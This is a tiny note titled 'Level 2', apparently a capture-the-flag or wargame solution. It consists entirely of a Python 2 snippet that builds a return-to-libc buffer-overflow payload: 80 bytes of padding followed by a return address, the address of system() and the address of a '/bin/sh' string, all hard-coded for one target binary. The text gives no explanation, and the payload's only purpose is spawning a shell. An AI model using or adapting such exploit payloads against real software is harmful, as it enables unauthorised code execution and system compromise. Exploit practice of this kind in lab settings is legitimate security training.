# Level 2

```
padding = 'A'*80
returnAddr = "\x3e\x85\x04\x08"
systemAddr="\x60\xb0\xe6\xb7"
binsh="\x58\xcc\xf8\xb7"
print padding+returnAddr+systemAddr+"0000"+binsh
```
